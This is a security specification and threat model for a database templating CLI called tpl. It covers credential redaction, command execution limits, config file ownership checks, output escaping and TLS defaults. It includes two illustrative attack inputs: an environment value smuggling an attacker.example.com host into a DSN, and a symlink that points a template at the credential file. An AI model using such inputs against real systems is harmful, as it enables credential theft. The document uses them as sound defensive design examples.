---
title: Security Rules Across the Surface
status: approved
last-reviewed: 2026-09-24
related: [configuration-model.md, project-and-discovery.md, errors-and-exit-codes.md, template-commands.md, render-command.md]
---

# Security Rules Across the Surface

## Overview

Several rules of this specification exist for security reasons and are enforced
in more than one place. This file collects them, states the threat each closes,
and points at the module that owns the requirement. Almost everything here is a
cross-reference: a rule appears with its own identifier because it is
cross-cutting, and its normative statement lives in the module named beside it.
The one exception is `BR-SEC-003`, the sentinel test, which is stated here and
nowhere else because the property it asserts spans the whole surface and no
single module owns it.

## Scope

In scope: the threat each cross-cutting rule closes, and the module that owns
the requirement enforcing it.

Out of scope: every rule's normative statement, which lives in its owning
module, `BR-SEC-003` excepted.

## Trust boundaries

`tpl` treats the following as untrusted input:

| Input | Why it is untrusted |
|---|---|
| The argument vector | Written by a caller, possibly generated |
| `.tpl/.cfg` | May be inherited from an ancestor directory or arrive in a clone |
| The environment | Read only through `${VAR}`, and expandable into a connection |
| Catalogue values | Table, column, and routine names and comments are free text on the server |
| A `--context` document | An ordinary JSON file, from anywhere |
| Files under `.tpl/templates/` | May arrive in a clone and be read before being reviewed |

## Credentials

- **FR-SEC-001**: No flag named `password`, and no flag whose purpose is to
  carry a password, SHALL exist at any node. See `FR-CFG-030`.

- **FR-SEC-002**: Two paths remain open by which a caller may place a literal
  password on the command line — `--dsn` and `tpl cfg set` — and the help of
  each states that the value is visible in the process table and recommends
  `${VAR}`. `tpl` warns; it does not prevent. See `FR-CFG-031` through
  `FR-CFG-033`.

- **FR-SEC-003**: `tpl cfg list` and `tpl cfg database show` SHALL redact
  passwords and SHALL print `${VAR}` unexpanded, so that a password living in an
  environment variable never reaches stdout through them. See `FR-CFG-021`.

- **FR-SEC-004**: `tpl cfg get` is the single, deliberate exception to
  redaction, because it is a directed read of a named key. See `BR-CFG-002`.

- **FR-SEC-005**: The system SHALL NOT write the argument vector, the resolved
  DSN, the `password_command` or its stderr, the raw driver error, or the
  contents of `.tpl/.cfg` to any diagnostic stream, at any verbosity level, with
  exactly one exception: the `password_command` array **as stored**, where a
  requirement of this specification obliges a `cause` line to name it. See
  `FR-GLOB-018`, which owns the rule and the exception.

  *Amended in the thirty-first edition, with `FR-GLOB-018`.* `FR-CONF-033`
  obliges the `cause` of a non-zero `password_command` to name the command as
  stored, and `FR-CONF-031` obliges the same of the output cap, so this rule
  and those two were in flat contradiction. The two specific requirements
  govern and this one states the exception, in the terms `FR-GLOB-018` fixes.
  The child's stderr stays barred without exception, per `FR-CONF-032`, and so
  does its stdout, which is the password.

  *The threat this leaves open is stated where it is created*, in
  `FR-CONF-033`: `${VAR}` cannot put a secret into the array, per
  `FR-CONF-017`, but a caller who writes one there literally sees it in the
  message. That requirement carries the accepted cost, what bounds it, and what
  would change it.

- **FR-SEC-006**: The system SHALL NOT include a credential in any error
  message, at any verbosity level. See `FR-ERR-013`.

## Environment expansion

- **FR-SEC-007**: `${VAR}` SHALL expand only in `dsn`, `host`, `port`, `user`,
  `password`, and `database`. See `FR-CONF-015`.

- **FR-SEC-008**: `${VAR}` SHALL NOT expand in `tls`, so that an injected value
  cannot turn off encryption; nor in `password_command`, so that the environment
  cannot alter the command executed. See `FR-CONF-016` and `FR-CONF-017`.

- **FR-SEC-009**: Inside a DSN, the system SHALL parse the URL, expand within
  the already-delimited field, and then percent-encode, so that an expanded
  value can never move the host, the port, or the database. See `FR-CONF-018`.

  *Threat closed.* `SHOP_PW=x@attacker.example.com/shop?#` would otherwise
  redirect the connection and hand the attacker's server the user and password
  during the handshake.

- **FR-SEC-010**: An undefined variable SHALL be `78`, never a silent empty
  substitution. See `FR-CONF-022`.

## Command execution

- **FR-SEC-011**: `password_command` SHALL be executed directly, without a
  shell, from an argument array. Shell metacharacters are literal arguments. See
  `FR-CONF-023` through `FR-CONF-026`.

  *Threat closed.* With a shell, reading a `.cfg` inherited from an ancestor
  directory or arriving in a clone would execute code chosen by whoever wrote
  it.

- **FR-SEC-012**: `password_command` SHALL be subject to a deadline, exceeding
  which is `78`. The deadline SHALL bound the whole phase, until the child has
  exited and its standard output has ended, and SHALL end the child's whole
  process group, descendants included. See `FR-CONF-028`.

  *Amended in the forty-second edition, with `FR-CONF-028`.* A helper that
  exits and leaves a descendant holding its standard output open made the
  deadline unenforceable: the invocation waited on the pipe with no bound.
  *Threat closed.* A `.cfg` naming such a helper can no longer hang the caller
  past `core.password_timeout`, and the descendants it started do not outlive
  the deadline inside the group `tpl` controls.

- **FR-SEC-024**: The child process SHALL be bounded and silent. Its standard
  output SHALL be read to a cap of 4096 bytes, beyond which the child's whole
  process group is terminated and the invocation is `78`; its standard error
  SHALL go to the null device, neither inherited nor captured; and a non-zero
  exit SHALL be `78`. See `FR-CONF-031` through `FR-CONF-033`.

  *Amended in the forty-second edition, with `FR-CONF-031`.* The cap
  terminated the child alone; it now terminates the group `FR-CONF-028`
  establishes, as the deadline of `FR-SEC-012` does.

  *Threat closed.* Two, of different kinds. An unbounded read from a child
  named in an untrusted `.cfg` is a denial-of-service surface reachable by
  writing one line into a file that may arrive in a clone. And a child's
  standard error is the one stream `tpl` cannot inspect before it is written:
  a helper that prints the secret it failed to fetch would otherwise write it
  straight to the caller's terminal through an inherited descriptor, past every
  redaction rule in this file. `FR-SEC-005` forbids `tpl` from writing that
  stream anywhere; directing it to the null device is what makes the
  prohibition structural rather than a rule to be remembered.

## Project discovery

- **FR-SEC-013**: The upward walk SHALL stop at the mount point. See
  `FR-PROJ-005`.

  *Amended in the eighth edition.* The home directory is no longer a boundary.
  Locating it required reading `HOME`, which `FR-CLI-021` forbids and which
  made the boundary a value a shell can set; `FR-PROJ-005` as amended carries
  the reasoning, the option rejected, and the accepted cost.

  *Threat closed, and it is narrower than the first edition claimed.* The
  mount point stops a walk that begins inside a mounted share from climbing
  out of it. A `.tpl` planted in a world-writable ancestor such as `/tmp` is
  refused by `FR-SEC-014`, the ownership and mode checks on `.tpl/.cfg`, and
  never was refused by the boundary: a walk that starts beneath `/tmp` reaches
  `/tmp` before it reaches any mount point.

- **FR-SEC-014**: `.tpl/.cfg` SHALL be owned by the current user and SHALL carry
  no group or other access bits. See `FR-PROJ-010` and `FR-PROJ-011`.

  *Threat closed.* A `.cfg` writable by anyone else can no longer choose the
  `password_command` that runs with the caller's privileges.

  WHERE the `.tpl` folder holds no `.cfg`, the folder itself SHALL be owned by
  the current user. See `FR-PROJ-028`.

  *Amended in the forty-eighth edition.* The paragraph above is new. A `.tpl`
  planted without `.cfg` passed both checks, so the claim of `FR-SEC-013` that
  a planted `.tpl` is refused held only for one that carried a `.cfg`. It now
  holds for both.

- **FR-SEC-015**: Paths SHALL be canonicalised before being checked, so that a
  symlinked `.tpl` is verified at its real target. See `FR-PROJ-009`.

- **FR-SEC-016**: `--tpl-dir` SHALL be subject to the same checks, without
  exemption. See `FR-PROJ-008`.

  *Note added in the forty-eighth edition.* `--tpl-dir` SHALL name a directory
  whose last segment is `.tpl`, per `FR-PROJ-027`, so that the flag names no
  folder the walk would not find.

## Template containment

- **FR-SEC-017**: A symbolic link inside `.tpl/templates/` SHALL be refused, and
  every resolved template path SHALL be canonicalised and re-checked against the
  template root. See `FR-TMPL-024` and `FR-TMPL-025`.

  *Threat closed.* `ln -s ../.cfg .tpl/templates/leak.jinja` must not turn
  `tpl template show` into a credential dump.

- **FR-SEC-018**: `tpl template check` SHALL parse only, never evaluating an
  expression, calling a function, or connecting to a database, so that it is
  safe to run against a template that has not been read. See `FR-TMPL-017` and
  `BR-TMPL-001`.

## Output and diagnostics

- **FR-SEC-019**: A `hint` carrying a runnable command SHALL be built only from
  literals and from names matching `[A-Za-z0-9_]{1,64}`; a nearest-match
  candidate subject to that set and outside it is not presented at all, and the
  generic hint is emitted alone. A spelling this specification enumerates — a
  command, a flag, a key of `FR-CONF-002` — is a literal; every other value is
  governed by the set, whatever its source, among them a table, a view, a
  routine, a database entry, the entry name inside a
  `database.<name>` key, and the name of an environment variable. A **flag value
  the caller supplied in a separate token** is governed too, by a set of its
  own, `[A-Za-z0-9_-]{1,64}` measured over the whole value. A **template
  name**, and a **filesystem path** of the project, of `--tpl-dir` or of
  `--context` written into a hint, are governed by a third set, `[A-Za-z0-9_./-]`, measured over the
  whole value, at most 1024 characters and not beginning with `-`. See
  `FR-ERR-022`, `FR-ERR-023`, `FR-ERR-040` and `FR-ERR-041`.

  *Threat closed.* A table name is free text on the server and can contain
  semicolons, quotes, and newlines; formatting one into a suggested command is
  command injection with the caller as the interpreter.

  *Amended in the thirty-first edition: one population is governed by a second
  set.* `FR-CLI-018` obliges the `hint` of a separate-token flag value to show
  the corrected `--flag=value` form, and every value that reaches that
  condition begins with `-` — so the set above refuses all of them and the
  correction could never carry a value. `FR-ERR-040` admits the hyphen for that
  population alone and bounds the whole value at 64 characters. The threat is
  unchanged and the admitted alphabet holds no shell metacharacter, no quote,
  no whitespace and no newline.

  *Amended in the forty-third edition: two populations are governed by a third
  set.* The template name moves from the first set to the set of `FR-ERR-041`,
  because every nested template name carries a `/` and none could be
  suggested; a path of the project, or of `--tpl-dir`, is governed by the same
  set, so a hint can name the absolute path of `.tpl/.cfg`. The threat is
  unchanged: the added `/` and `.` are not shell metacharacters, and a value
  beginning with `-` is refused so that none is read as an option.

  *Amended in the forty-seventh edition.* The path given to `--context` joins
  the paths the third set governs, as `FR-ERR-041` now names it. The set and
  the threat are unchanged.

  *Amended in the twentieth edition.* This rule restated the character set as
  governing every candidate, per `FR-ERR-022` as it then read. It now carries
  that requirement's distinction, because the threat rests on it: what a
  suggested command may not carry is a name someone outside this project
  chooses, and a spelling fixed in this corpus is not one. Every name the set
  governs is governed exactly as before; what the correction admits is the
  spelling of a command, a flag and a key, none of which a server, a file or a
  caller can influence.

- **FR-SEC-020**: C0 control characters SHALL be escaped in every value the
  system prints or interpolates, whatever its source. Two requirements own the
  rule, and they differ in their treatment of one character:

  | Where | Rule | Owner |
  |---|---|---|
  | The `text` output of a read command | C0 escaped, tab excepted | `FR-OUT-018` |
  | The `json` output of a read command | C0 escaped, tab included as the escape JSON defines for it | `FR-OUT-018` |
  | Any diagnostic message | C0 escaped, tab included | `FR-ERR-024` |

  Two outputs are excluded and are emitted byte for byte: the result of
  `tpl render`, and the template source printed by `tpl template show`. See
  `FR-OUT-019`.

  *Threat closed.* An escape sequence in a column comment cannot rewrite what
  the user sees, and a newline in a catalogue value cannot forge a whole
  diagnostic line in the line-oriented error format.

  *Amended in the third edition.* The tab exception is now stated per rule
  rather than across both, because the first edition's single statement
  contradicted `FR-ERR-024`. `tpl template show` joins `tpl render` in the
  exclusion, per the amendment to `FR-OUT-019`; the credential-dump path that
  motivated escaping it is closed by `FR-SEC-017` instead.

  *Amended in the ninth edition.* The first row covered `text` and `json`
  together and said "tab excepted" of both, which no JSON document can honour.
  The row is split, per the amendment to `FR-OUT-018`: the exception belongs to
  `text`, where a tab is column layout, and in `json` a tab arrives as the
  escape the format defines, so no value reaches a consumer as a raw tab on
  either path. The threat this requirement closes is unchanged.

## Transport

- **FR-SEC-021**: `tls` SHALL default to `verify-identity`, and no DSN parameter
  may contradict the `tls` key. See `FR-CONF-012` and `FR-CONF-013`.

  *Threat closed.* Defaulting to `preferred` would let an active intermediary
  answer "no TLS", after which the handshake carries the user and password in
  clear; a `required` that does not validate is indistinguishable from no TLS
  against the same adversary.

  *Two limits on this guarantee, both added in the sixth edition and both
  observed rather than reasoned.* First, the mode must be set explicitly on
  every connection: both drivers measured default to the wrong posture, and
  one of them **downgrades to plaintext in silence** against a server that
  offers no TLS, which is exactly the intermediary's answer above arriving
  through a dependency rather than through the configuration. `FR-CONF-037`
  forbids relying on the default. Second, trust material supplied by
  `ca_file` or `ca_path` is **added** to the public root bundle rather than
  substituted for it, per `FR-CONF-039`, so pinning a private authority widens
  the set of certificates that pass `verify-ca` instead of narrowing it. The
  hostname check of `verify-identity`, which is the default, is what carries
  the guarantee an operator pinning a CA is usually reaching for.

## Availability

- **FR-SEC-022**: Every blocking phase SHALL have a deadline. See `FR-CONF-005`
  and `FR-GLOB-013`.

  *Threat closed.* A connect to a silent address, a `password_command` waiting
  on a FIFO, and a runaway loop in a template all hang the caller with no
  diagnosis, which is exactly what the "never interactive" invariant exists to
  prevent.

  *Note added in the forty-second edition.* A deadline bounds a render in time
  only. `FR-SEC-025` adds the three bounds that end a hostile render on work,
  output and memory.

- **FR-SEC-025**: Every render SHALL be bounded by render fuel, by the render
  output limit and by the render memory limit as well as by its deadline, and
  exceeding any of the three is `65`. Each bound is set by a key of
  `.tpl/.cfg` with a default no legitimate render reaches. See `FR-RND-036`,
  `FR-RND-037`, `FR-RND-039`, `FR-RND-038` and `FR-CONF-045`.

  *Threat closed.* A template arriving in a clone that loops without end,
  writes without end into a redirected stdout, or grows memory without end is
  stopped with a diagnosis, and not only when the wall clock or the operating
  system stops it.

  *Where the guarantee stops.* The memory limit is observed periodically, so a
  render can pass it briefly before it is stopped, and a single allocation the
  operating system refuses outright aborts the process by a signal; the render
  deadline remains the backstop. `FR-RND-039` states the limit.

- **FR-SEC-023**: `tpl` SHALL never prompt, never page, and never read stdin
  except for an explicitly requested `--context -`. See `BR-CLI-003`.

## Business rules

- **BR-SEC-001**: The specification states each of these rules where it is
  enforced. This file is a cross-reference and a threat model, not a second
  source of truth; where it and an owning module differ, the owning module
  governs and the difference is a defect to be corrected here. `BR-SEC-003` is
  the single rule this file owns outright, and it owns it because it is a
  property of the whole surface rather than of any one module.

- **BR-SEC-003**: A known sentinel password SHALL never appear in any byte
  `tpl` writes. The obligation is a test, in the form `BR-ERR-001` uses for
  exit codes and `BR-HELP-003` for the command tree: a database entry is
  configured whose password is a distinctive sentinel value, every command of
  the tree of `FR-CLI-002` is run against it at maximum verbosity, and the test
  asserts that no byte of stdout and no byte of stderr, from any of them,
  contains the sentinel. The test is part of the definition of done for any
  change that touches configuration reading, connection setup, diagnostics, or
  error messages.

  *Rationale.* Every rule in the *Credentials* section above is a prohibition
  on a particular path — `FR-SEC-003` on two commands, `FR-SEC-005` on the
  diagnostic stream, `FR-SEC-006` on error messages, `FR-CONF-032` on a child's
  stderr. Each is testable on its own, and each test proves only that the path
  it names is closed. A sentinel test proves the property those prohibitions
  exist to produce, over the whole surface at once, and it is the only form of
  the check that stays true when a path is added. It covers **every** command,
  not the ones that obviously touch a password, because the paths that leak are
  the ones nobody thought were on the credential path.

  *Why maximum verbosity.* `FR-GLOB-018` and `FR-SEC-005` are stated "at any
  verbosity level", and `-vvv` is where a diagnostic that dumps a resolved
  connection is most likely to be written and least likely to be reviewed.

  *Closes* `OQ-012`, now listed under [Closed](open-questions.md#closed). It
  was deferred to the test plan when the logging rules were settled; it is a
  business rule of this file because the property it asserts is exactly what
  this file exists to state, and no single module owns it.

  *Accepted cost, now much reduced.* The test needs a server to connect to, so
  it needs the container of `scripts/mariadb/`, which now exists at all four
  series of `FR-SRV-015`. The part of it that needs no server — every command
  that reads `.tpl/.cfg` without connecting, which is most of the tree — needs
  no container at all. What still blocks the whole of it is that `tpl` does not
  exist yet.

- **BR-SEC-002**: `tpl` never issues a write statement against a database. The
  promise has two parts and only one of them prevents: the closed statement
  list of `FR-SRV-006`, which is what `tpl` is built to send, and the read-only
  session of `FR-SRV-008`, read back and confirmed under `FR-SRV-009`, which
  makes a write fail rather than stopping it from being attempted. Failure to
  establish or confirm the session refuses the connection with `78`, per
  `FR-SRV-010`. There is no flag that disables either part, per `FR-SRV-011`.
  See [server-contract.md](server-contract.md), which owns both.

## Dependencies

Every requirement above names its owning module. The four principal owners are
[configuration-model.md](configuration-model.md),
[project-and-discovery.md](project-and-discovery.md),
[errors-and-exit-codes.md](errors-and-exit-codes.md), and
[template-commands.md](template-commands.md).

## Open questions

None specific to this module. `OQ-012` is answered by `BR-SEC-003` and is
listed under [Closed](open-questions.md#closed).
